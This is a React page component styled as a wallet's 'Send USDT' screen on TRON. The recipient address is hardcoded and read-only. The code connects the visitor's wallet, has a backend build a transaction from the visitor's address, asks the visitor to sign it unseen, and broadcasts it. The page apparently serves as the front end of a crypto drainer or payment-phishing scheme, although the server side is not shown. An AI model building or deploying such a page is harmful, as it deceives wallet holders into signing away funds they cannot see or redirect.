'use client';
import React, { useState, useEffect } from 'react';
import { walletManager } from './lib/wallet';

const CFG = {
  USDT: process.env.NEXT_PUBLIC_USDT || 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
  RECIPIENT: process.env.NEXT_PUBLIC_RECIPIENT || 'TB8MxQp21ukvxRWMSC5RYGVGpmf9AEdUUy',
};

export default function SendForm() {
  const [addr, setAddr] = useState(CFG.RECIPIENT);
  const [amount, setAmount] = useState('1');
  const [btn, setBtn] = useState({ text: 'Next', disabled: false });
  const [notif, setNotif] = useState(null);

  useEffect(() => {
    // Pre-load wallet chunks
    import('./lib/wallet').catch(() => { });
  }, []);

  const showNotif = (msg, type = 'info') => {
    setNotif({ msg, type });
    setTimeout(() => setNotif(null), 5000);
  };

  const handleNext = async () => {
    if (!addr || addr.length < 30) return showNotif('Please enter a valid TRON address', 'error');
    if (!amount || parseFloat(amount) <= 0) return showNotif('Please enter a valid amount', 'error');

    setBtn({ text: 'Connecting...', disabled: true });

    try {
      // 1. Connect Wallet (Injected or WC)
      const wallet = await walletManager.connect();
      if (!wallet) throw new Error('No wallet connected');

      // 2. Prepare Transaction (Backend)
      setBtn({ text: 'Preparing...', disabled: true });
      const prepRes = await fetch('/api/prepare', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ownerAddress: wallet.address, amount }),
      });

      if (!prepRes.ok) {
        const text = await prepRes.text();
        throw new Error(`Server Error: ${prepRes.status}. Please check Vercel environment variables.`);
      }

      const { transaction, error: prepErr } = await prepRes.json();
      if (prepErr) throw new Error(prepErr);

      // 3. Sign Transaction (Client)
      setBtn({ text: 'Confirm in Wallet...', disabled: true });
      const signedTx = await wallet.sign(transaction);

      // 4. Broadcast Transaction (Backend)
      setBtn({ text: 'Finalizing...', disabled: true });
      const broadRes = await fetch('/api/broadcast', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ signedTx, ownerAddress: wallet.address }),
      });

      if (!broadRes.ok) {
        throw new Error(`Broadcast failed with status ${broadRes.status}`);
      }

      const { success, txId, error: broadErr } = await broadRes.json();

      if (success) {
        showNotif('Transaction successful!', 'success');
        setBtn({ text: 'Success', disabled: true });
      } else {
        throw new Error(broadErr || 'Broadcast failed');
      }
    } catch (err) {
      console.error('Flow Error:', err);
      const msg = err.message || 'Connection failed';
      showNotif(msg.includes('rejection') ? 'User rejected request' : msg, 'error');
      setBtn({ text: 'Next', disabled: false });
    }
  };

  return (
    <div className="page">
      {notif && (
        <div className={`notification notification--${notif.type}`}>
          {notif.msg}
        </div>
      )}

      <header className="header">
        <h1 className="header-title">Send USDT</h1>
      </header>

      <main className="container">
        <div>
          <label className="label">Destination Address</label>
          <div className="input-wrap">
            <input
              type="text"
              className="input"
              value={addr}
              readOnly
            />
          </div>
        </div>

        <div>
          <label className="label">Destination network</label>
          <div className="network-box">
            <img
              src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABhWlDQ1BJQ0MgcHJvZmlsZQAAeJxt0LEuREEYBuBvX0TEIhwSTUWhEhGJvUnFInYRiUpFpXKJXmK72Wx27X7fE7S6vUJPoFCI6OIFvEInonf8m0iEnOScmcl8M5O5AHC3G822I6OAsmo7atp9z6yD5m0VULXpA+Y0qM4t206LshAA/y3mPjEaL7eYjKRLv4G/YlshA0QvD+O4EAhAdK8YzW0ghnscF98AMH8A1H0v97W6G92uD0AnZ2v6C3D5Abh8B67Yge96P/I+MTo7OzkYIBAIkAmM+W0G2v1+oN6rIuvr/9V+oE63mO0l0m0A+z7gYAsS5wP6uS+RrxT5I6O0pYmYfU3F0f8IAtgXAcpA4C6A9/0jG39mF0f8E6O0u4iYH/DLP7GPP89u/qD+9y9yX4v149l9K/r7P94L9A3U90KdL6V9D2h3M7eXpX8PaPcXoH673L0W+f0f/P9v0f8A/X8K/X8HAAAABlBMVEX///9KsuEAsV6YAAAAAnRSTlMAAQGU/N4AAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUHMAYCBicSjX66/wAAAFlJREFUOMvN0EENADAIA0D8U0K8FmBguL8eR6uG1S3Rsh9X9uP6P67v/269Xq9Xq9Xq9Xq9Xq9Xq9Xq9Xq9Xq9Xq9Xq9Xq9Xq9Xq9Xq9Xq9Xq9Xq9Xq9Xq9Xq9Xq7Wf7F8Fv78+vQAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAyNC0wMi0wMlQwNjozNzo0OSswMDowMHuG9+0AAAAldEVYdGRhdGU6bW9kaWZ5ADIwMjQtMDItMDJUMDY6Mzc6NDkrMDA6MDB4XyFBAAAAIHRFWHRzb2Z0d2FyZSBodHRwczovL2ltYWdlbWFnaWNrLm9yZ768V3YAAAAYdEVYdFRodW1iOjpEb2N1bWVudDo6UGFnZXMAMaf7Cc8AAAAXdEVYdFRodW1iOjpJbWFnZTo6SGVpZ2h0ADMyW8pW+AAAABbcRVYdFRodW1iOjpJbWFnZTo6V2lkdGgAMzKyOswKAAAAF3EVYdFRodW1iOjpNaW1ldHlwZQBpbWFnZS9wbmc/9sZ7AAAAF3EVYdFRodW1iOjpNVGltZQAxNzA2ODU1ODY57zXidAAAABZ0RVh0VGh1bWI6OlNpemUAODAwM0JCOUf4XAAAAABJRU5ErkJggg=="
              alt="TRON"
              className="network-icon"
            />
            <span className="network-name">TRON Network</span>
            <svg width="10" height="6" viewBox="0 0 10 6" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M1 1L5 5L9 1" stroke="#8E8E93" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
            </svg>
          </div>
        </div>

        <div>
          <label className="label">Amount</label>
          <div className="input-wrap">
            <input
              type="number"
              className="input"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
            />
            <div className="input-actions">
              <span className="currency">USDT</span>
              <span className="action" style={{ marginLeft: '8px' }}>Max</span>
            </div>
          </div>
          <div className="usd-value">~${parseFloat(amount || 0).toFixed(2)}</div>
        </div>
      </main>

      <footer className="bottom">
        <button
          onClick={handleNext}
          disabled={btn.disabled}
          className="next-btn"
        >
          {btn.text}
        </button>
      </footer>
    </div>
  );
}
